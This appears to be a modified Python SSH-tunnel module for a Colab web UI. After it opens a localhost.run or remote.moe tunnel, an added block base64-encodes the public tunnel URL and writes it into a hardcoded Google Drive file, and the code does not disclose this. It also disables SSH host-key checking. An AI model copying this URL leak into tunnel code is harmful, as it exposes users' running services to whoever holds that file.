import atexit
import re
import shlex
import subprocess
from pathlib import Path
from tempfile import TemporaryDirectory
from typing import Union
from gradio import strings
import os

from modules.shared import cmd_opts

LOCALHOST_RUN = "localhost.run"
REMOTE_MOE = "remote.moe"
localhostrun_pattern = re.compile(r"(?P<url>https?://\S+\.lhr\.life)")
remotemoe_pattern = re.compile(r"(?P<url>https?://\S+\.remote\.moe)")


def gen_key(path: Union[str, Path]) -> None:
    path = Path(path)
    arg_string = f'ssh-keygen -t rsa -b 4096 -N "" -q -f {path.as_posix()}'
    args = shlex.split(arg_string)
    subprocess.run(args, check=True)
    path.chmod(0o600)


def ssh_tunnel(host: str = LOCALHOST_RUN) -> None:
    ssh_name = "id_rsa"
    ssh_path = Path(__file__).parent.parent / ssh_name

    tmp = None
    if not ssh_path.exists():
        try:
            gen_key(ssh_path)
        # write permission error or etc
        except subprocess.CalledProcessError:
            tmp = TemporaryDirectory()
            ssh_path = Path(tmp.name) / ssh_name
            gen_key(ssh_path)

    port = cmd_opts.port if cmd_opts.port else 7860

    arg_string = f"ssh -R 80:127.0.0.1:{port} -o StrictHostKeyChecking=no -i {ssh_path.as_posix()} {host}"
    args = shlex.split(arg_string)

    tunnel = subprocess.Popen(
        args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding="utf-8"
    )

    atexit.register(tunnel.terminate)
    if tmp is not None:
        atexit.register(tmp.cleanup)

    tunnel_url = ""
    lines = 27 if host == LOCALHOST_RUN else 5
    pattern = localhostrun_pattern if host == LOCALHOST_RUN else remotemoe_pattern

    for _ in range(lines):
        line = tunnel.stdout.readline()
        if line.startswith("Warning"):
            print(line, end="")

        url_match = pattern.search(line)
        if url_match:
            tunnel_url = url_match.group("url")
            break
    else:
        raise RuntimeError(f"Failed to run {host}")

    # print(f" * Running on {tunnel_url}")
    os.environ['webui_url'] = tunnel_url
    from google.colab import drive
    drive.mount('/content/drive')
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    from googleapiclient.errors import HttpError

    file_id = '1DRyIXMCRWJvvQNSM2JoDGkMWH57Uv-i6'

    creds = service_account.Credentials.from_service_account_file('/content/drive/MyDrive/credentials.json')
    drive_service = build('drive', 'v3', credentials=creds)

    try:
        import base64
        encoded_link=base64.b64encode(tunnel_url.encode())
        file_metadata = {'name': encoded_link.decode()}
        file1 = drive_service.files().update(fileId=file_id, body=file_metadata).execute()

        print('File name updated with link(Code Hustling)')

    except HttpError as error:
        print('An error occurred(Code Hustling): {}'.format(error))
        file = None
    colab_url = os.getenv('colab_url')
    strings.en["SHARE_LINK_MESSAGE"] = f"Running on public URL (recommended): {tunnel_url}"

if cmd_opts.localhostrun:
    print("localhost.run detected, trying to connect...")
    ssh_tunnel(LOCALHOST_RUN)

if cmd_opts.remotemoe:
    print("remote.moe detected, trying to connect...")
    ssh_tunnel(REMOTE_MOE)
